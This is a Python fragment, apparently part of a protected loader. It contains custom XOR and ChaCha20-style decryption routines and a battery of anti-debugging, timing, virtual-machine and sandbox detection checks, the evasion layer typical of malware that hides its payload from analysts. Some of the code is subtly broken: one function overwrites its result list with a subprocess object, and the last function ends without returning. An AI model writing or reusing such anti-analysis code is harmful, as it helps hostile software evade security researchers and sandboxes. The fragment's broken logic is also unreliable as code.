def _xr(d,k):
    r=bytearray(d)
    for rn in range(31,-1,-1):
        ks=__import__("hashlib").sha512(k+bytes([rn])+b"XNC_RND").digest()
        for i in range(len(r)):
            r[i]^=ks[i%len(ks)]
    return bytes(r)

def _ch(d,k,n):
    result=bytearray(d)
    k_w=list(struct.unpack('<8I',k[:32]))
    n_w=list(struct.unpack('<3I',n[:12]))
    for block in range((len(d)+63)//64):
        state=[0x61707865,0x3320646E,0x79622D32,0x6B206574,k_w[0],k_w[1],k_w[2],k_w[3],k_w[4],k_w[5],k_w[6],k_w[7],n_w[0]^block,n_w[1],n_w[2],0]
        def qr(a,b,c,d):
            state[a]=(state[a]+state[b])&0xFFFFFFFF;state[d]^=state[a]
            state[d]=((state[d]<<16)|(state[d]>>16))&0xFFFFFFFF
            state[c]=(state[c]+state[d])&0xFFFFFFFF;state[b]^=state[c]
            state[b]=((state[b]<<12)|(state[b]>>20))&0xFFFFFFFF
            state[a]=(state[a]+state[b])&0xFFFFFFFF;state[d]^=state[a]
            state[d]=((state[d]<<8)|(state[d]>>24))&0xFFFFFFFF
            state[c]=(state[c]+state[d])&0xFFFFFFFF;state[b]^=state[c]
            state[b]=((state[b]<<7)|(state[b]>>25))&0xFFFFFFFF
        working=state[:]
        for _ in range(10):
            qr(0,4,8,12);qr(1,5,9,13);qr(2,6,10,14);qr(3,7,11,15)
            qr(0,5,10,15);qr(1,6,11,12);qr(2,7,8,13);qr(3,4,9,14)
        for i in range(16):working[i]=(working[i]+state[i])&0xFFFFFFFF
        bb=b''.join(struct.pack('<I',w)for w in working)
        s,e=block*64,min(block*64+64,len(d))
        for i in range(s,e):result[i]^=bb[i-s]
    return bytes(result)

def _chkd():
    try:
        if sys.gettrace():return True
        if sys.modules.get("pdb"):return True
        if sys.modules.get("ipdb"):return True
        if sys.modules.get("pydevd"):return True
    except:pass
    return False

def _chkp():
    r=[]
    try:
        if platform.system()=="Windows":
            import ctypes
            try:
                if ctypes.windll.kernel32.IsDebuggerPresent():r.append(1)
            except:pass
        elif platform.system() in("Linux","Darwin","FreeBSD","Android"):
            try:
                with open("/proc/self/status","rb")as f:
                    d=f.read()
                    if b"TracerPid:\t0"not in d:r.append(1)
                    if b"Name:\tpython"in d or b"Name:\tpython3"in d:pass
            except:pass
    except:pass
    return r

def _chkv():
    r=[]
    try:
        if platform.system()=="Windows":
            import ctypes
            try:
                h=ctypes.windll.kernel32.OpenProcess(0x1000,0,os.getpid())
                if h:
                    v=ctypes.c_int(0)
                    ctypes.windll.kernel32.CheckRemoteDebuggerPresent(h,ctypes.byref(v))
                    ctypes.windll.kernel32.CloseHandle(h)
                    if v.value:r.append(1)
            except:pass
    except:pass
    return r

def _chkt():
    r=[]
    try:
        t1=time.perf_counter()
        for _ in range(100000):pass
        if time.perf_counter()-t1>0.2:r.append(1)
    except:pass
    return r

def _chke():
    r=[]
    vm_names=["vmware","virtualbox","qemu","kvm","parallels","hyperv","bhyve","docker","wsl","container","sandbox"]
    mac_addr=["00:05:69","00:0C:29","00:1C:14","00:50:56","08:00:27"]
    try:
        if platform.system()=="Linux":
            with open("/proc/cpuinfo","rb")as f:
                c=f.read().lower()
                for v in vm_names:
                    if v.encode()in c:r.append(1)
            try:
                with open("/sys/class/dmi/id/product_name","r")as f:
                    pn=f.read().lower()
                    for v in vm_names:
                        if v in pn:r.append(1)
            except:pass
        elif platform.system()=="Windows":
            import ctypes
            for dev in[b"VBoxMiniRdrDN",b"VBoxGuest",b"VMwarePvsc",b"VBoxVideo",b"vmci"]:
                try:
                    h=ctypes.windll.kernel32.CreateFileA(b"\\\\.\\"+dev,0,0,None,3,0,None)
                    if h!=-1:ctypes.windll.kernel32.CloseHandle(h);r.append(1);break
                except:pass
            try:
                import subprocess
                r=subprocess.run(["wmic","bios","get","serialnumber"],capture_output=True,text=True,timeout=5)
                if r.stdout:
                    s=r.stdout.lower()
                    if "vmware"in s or "virtual"in s or len(s.strip())<5:r.append(1)
            except:pass
    except:pass
    return r

def _chks():
    r=[]
    try:
        import ctypes
        if platform.system()=="Windows":
            try:
                kernel32=ctypes.windll.kernel32
                MEM_COMMIT=0x1000;PAGE_READWRITE=0x04
                ptr=kernel32.VirtualAlloc(None,4096,MEM_COMMIT,PAGE_READWRITE)
                if ptr and ptr!=-1:
                    kernel32.VirtualFree(ptr,0,0x8000)
                else:r.append(1)
            except:pass
    except:pass
